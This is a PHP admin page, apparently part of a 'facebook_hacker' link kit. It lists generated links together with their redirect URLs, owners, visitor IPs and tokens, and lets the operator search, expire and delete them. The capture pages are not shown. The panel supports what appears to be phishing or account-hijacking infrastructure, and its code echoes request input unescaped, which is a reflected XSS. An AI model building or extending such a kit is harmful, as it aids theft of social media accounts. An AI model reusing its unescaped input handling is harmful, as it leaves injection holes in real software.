<?php
if (isset($_GET['ordem']) && !empty($_GET['ordem'])) {
	if ($_GET['ordem'] == "novos" || $_GET['ordem'] == "antigos") {
		$ordem = $_GET['ordem'];
	}
	else{ 
		$ordem = "novos";
	}
}else{
	$ordem = "novos";
}
switch ($ordem) {
	case 'novos':
	$ordem = "DESC";
	break;
	case 'antigos':
		$ordem = "ASC";
	break;
}
/*** DELETAR TUDO */
if (isset($_GET['dell']) && $_GET['dell'] == "all") {
	$query = "DELETE FROM facebook_hacker ";
	executa_query($query);header('Location: ./?p=links.php');exit();
}
/*** DELETAR OFFS */
if (isset($_GET['dell']) && $_GET['dell'] == "off") {
	$lista = "";
	$ler = ler_db("facebook_hacker");
	if (!empty($ler)) {
		foreach ($ler as $lers) {
			$dataLink = $lers['data'];
			$id = $lers['id'];

			$Expira = DateTime::createFromFormat('d-m-Y H:i:s', $lers['data']);
			$Expira->add(new DateInterval('P'.$lers['prazo'].'D'));
			$Expira =  $Expira->format('d-m-Y H:i:s');
			if(strtotime($dataLocal) > strtotime($Expira)){
				if (!empty($lista)) {
					$lista = $lista. ",'".$id."' ";
				}else{$lista = $lista. "'".$id."' ";}
				
			}
		}
	}
	$sql = "DELETE FROM facebook_hacker WHERE id IN (".$lista.")";
	executa_query($sql);header('Location: ./?p=links.php');exit();
}
/*** DELETAR */
if (isset($_GET['delete']) && !empty($_GET['delete'])) {
	$deletar = anti_injection(intval($_GET['delete']));
	$query = "DELETE FROM facebook_hacker WHERE id = '".$deletar."' ";
	executa_query($query);
	header('Location: ./?p=links.php');exit();
}
?>
<h1>Páginas</h1>
<div class="topo">
	<form>
		<input type="hidden" name="p" value="links.php">
		<input type="search" name="busca" placeholder="Billie Jean Version THIS IS IT is fuck!" <?php if(isset($_GET['busca'])){echo "value='".$_GET['busca']."'";} ?>>
		<select name="where">
			<option value="0" <?php if(@$_GET['where']=="0"){echo "selected";} ?> >Todos</option>
			<option value="1" <?php if(@$_GET['where']=="1"){echo "selected";} ?> >Titulo</option>
			<option value="2" <?php if(@$_GET['where']=="2"){echo "selected";} ?> >Descrição</option>
			<option value="3" <?php if(@$_GET['where']=="3"){echo "selected";} ?> >URL</option>
			<option value="4" <?php if(@$_GET['where']=="4"){echo "selected";} ?> >Usuario</option>
			<option value="5" <?php if(@$_GET['where']=="5"){echo "selected";} ?> >ip</option>
			<option value="6" <?php if(@$_GET['where']=="6"){echo "selected";} ?> >TOKEN</option>
			<option value="7" <?php if(@$_GET['where']=="7"){echo "selected";} ?> >id</option>
			<option value="8" <?php if(@$_GET['where']=="8"){echo "selected";} ?> >Data</option>
			<option value="9" <?php if(@$_GET['where']=="9"){echo "selected";} ?> >Imagem</option>
		</select>
		<select name="ordem">
			<option value="novos" <?php if(@$_GET['ordem']=="novos"){echo "selected";} ?>>Novos</option>
			<option value="antigos" <?php if(@$_GET['ordem']=="antigos"){echo "selected";} ?>>Antigos</option>
		</select>
		<button type="submit">Navegar</button>
	</form>
</div>
<hr>
<a href="./?p=links.php&dell=off">Excluir desativados</a> | <a href="./?p=links.php&dell=all">Excluir Tudo</a>
| <select onchange="ordem();" id="ordem_select"><option <?php if(@$_GET['ordem']=="novos"){echo "selected";} ?> value="1">Novos</option><option <?php if(@$_GET['ordem']=="antigos"){echo "selected";} ?> value="0">Antigos</option></select> | TOTAL:<span id="total">0</span>
<hr>


<?php if(isset($_GET['busca'])){echo "<h1 style='font-weight: normal;'>Pesquisa: <a style='color:#444;' href='./?p=links.php''> << </a> </h1>";}?>
<ul class="lista"> 
	<?php
	if(isset($_GET['busca'])){
		$key = anti_injection($_GET['busca']);
		$where = array('1' => 'titulo', '2' => 'descrição', '3' => 'url_redir', '4' => 'usuario', '5' => 'ip', '6' => 'token', '7' => 'id', '8' => 'data', '9' => 'imagem' );

		if ($_GET['where'] == '0') {
			$ler = @ler_db("facebook_hacker", "WHERE (token LIKE '%". $key ."%' OR titulo LIKE '%". $key ."%' OR descricao LIKE '%". $key ."%' OR url_redir LIKE '%". $key ."%' OR usuario LIKE '%". $key ."%' OR ip LIKE '%". $key ."%' OR id LIKE '%". $key ."%' OR data LIKE '%". $key ."%' ) ORDER BY id ".$ordem."");
		}else{
			$ler = @ler_db("facebook_hacker", "WHERE ".$where[$_GET['where']]." LIKE '%". $key ."%' ORDER BY id ".$ordem."");
		}
		
	}else{
		$ler = ler_db("facebook_hacker", " ORDER BY id ".$ordem."");
	}
	if (!empty($ler)) {
		$total = 0;
		foreach ($ler as $lers) {
			$total ++;
			$titulo = htmlspecialchars($lers['titulo']);
			$dataLink = $lers['data'];
			$token = $lers['token'];

			$Expira = DateTime::createFromFormat('d-m-Y H:i:s', $lers['data']);
			$Expira->add(new DateInterval('P'.$lers['prazo'].'D'));
			$Expira =  $Expira->format('d-m-Y H:i:s');
			if(strtotime($dataLocal) > strtotime($Expira)){
				$status = "<span style='color:red'>OFF </span>";
			}else{
				$status = "<span style='color:green'>ON </span>";
			}
			?>
			<li>
				<?php echo $status;?> 
				<a title="<?php echo 'DONO:'.$lers['usuario']; ?>" href="javascript:void(0)" ondblclick="linkss('viwer', '<?php echo $token;?>');" onclick="linkss('menu', '<?php echo $token;?>');" target="_blank" class='linkss'>
				 (<?php echo $token;?>) <?php echo $titulo." ". date('d/m/Y h:m:i',  strtotime($dataLink));?> 
				</a>
				<div class="options" id="opt<?php echo $token;?>">
					<a href="./?p=links.php&delete=<?php echo $lers['id']; ?>">Excluir</a> 
				</div>
			</li>
			<?php
		}
	}
	?>
</ul>
<style type="text/css">
	.linkss:active:after{
		color:#000;
		content: " +1 ";
	}
	li .options{
		display: none;text-align: center;padding: 5px;position: relative;
		background: #333;color:#FFF;margin: 4px 0px;
	}
	li .options:before{
		content: " ";
		position: absolute;
		top:-50%;left: 15px;
		border: 8px solid red;
		border-color: transparent transparent #333 transparent;
	}
</style>
<script type="text/javascript">
	edita_texto('total', '<?php echo @$total;?>');
	function linkss(tipo, token){
		if (tipo == 'viwer'){
			window.open('/facebook-hacker/links/'+token+'/?root=root', '_blank');
		}
		if (tipo == 'menu'){
			if (document.getElementById("opt"+token).style.display ==  "block") {
				document.getElementById("opt"+token).style.display =  "none";
			}else{
				document.getElementById("opt"+token).style.display =  "block";
			}
		}
	}
	function ordem(){
	if(document.getElementById('ordem_select').value =="1"){
		window.location.href="./?p=links.php&ordem=novos";
	}else{
		window.location.href="./?p=links.php&ordem=antigos";
	}
}
</script>